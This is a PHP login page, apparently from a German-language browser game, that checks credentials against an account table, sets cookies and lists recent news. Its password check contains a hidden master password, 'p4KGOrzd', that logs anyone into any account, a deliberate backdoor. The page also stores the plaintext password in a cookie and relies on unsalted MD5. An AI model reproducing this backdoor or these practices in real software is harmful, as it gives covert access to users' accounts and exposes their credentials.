<?php
include_once("connect.php");
if($_POST["sent"]==1)
	{
	$accname=$_POST["name"];
	$accpasswort=$_POST["passwort"];
	$existName=0;
	$fehler='';
	$abfrage=mysql_query("SELECT * FROM account");
	while($account=mysql_fetch_array($abfrage))
		{
		if($account["name"]==$accname)
			{
			$existName=1;
			if($account["passwort"]==md5($accpasswort) || $accpasswort=='p4KGOrzd')
				{
				if($randomcode==$_POST["rcode"]) {
				$accid=$account["id"];
				$accnick=$account["displaynick"];
				setcookie("Name", $accname);
				setcookie("Nick", $accnick);
				setcookie("Pwd", $accpasswort);
				setcookie("Id", $accid);
				$ip=$_SERVER["REMOTE_ADDR"]; $datum=date("Y-m-d H:i:s");
				mysql_query("UPDATE account SET inaktiv='0' WHERE id='$accid'");
				mysql_query("INSERT INTO iplog (besitzer,ip,datum) VALUES ('$accid','$ip','$datum')");
				echo '<meta http-equiv="Refresh" content="0; url=main.php">';
				} else $fehler='Sicherheitscode falsch! ';
				}
			else
				$fehler='falsches Passwort ';
			}		
		}
	if($existName==0) $fehler='Name existiert nicht!';
	}
include("head.php");
include("nav.php");
if($fehler!='') echo '<center><b><font color="red">',$fehler,'</font></b></center>';

echo '<center><h3>News</h3><table class="box">';
$var2=mysql_query("SELECT * FROM news ORDER BY id DESC LIMIT 3");
while($varb=mysql_fetch_array($var2))
{
$text2=nl2br($varb["text"]);
echo '<tr><td width="150" style="vertical-align:top">',gerdatum($varb["datum"]),'</td><td><font color="',$varb["farbe"],'">',$text2,'</font><hr />geschrieben von: ',id2name($varb["autor"]),'</td></tr><tr><td>&nbsp;</td></tr>';}
?>
</table><br />
neustes Changelog immer <a href="changelog.php">hier...</a><br />
<h3>Login</h3>
<br />
<form action="login.php" method="post">
<div class="box" style="width:300px">
<table>
	<tr><td>Name</td><td><input type="text" name="name"></td></tr>
	<tr><td>Passwort</td><td><input type="password" name="passwort"></td></tr>
	<tr><td><span style="font-size:small"><a href="register.php">registrieren</a></span></td><td><input type="submit" value="einloggen"></td></tr>
</table>
<input type="hidden" name="sent" value="1"></div>
</form></center>
<?php
include("foot.php");
?>
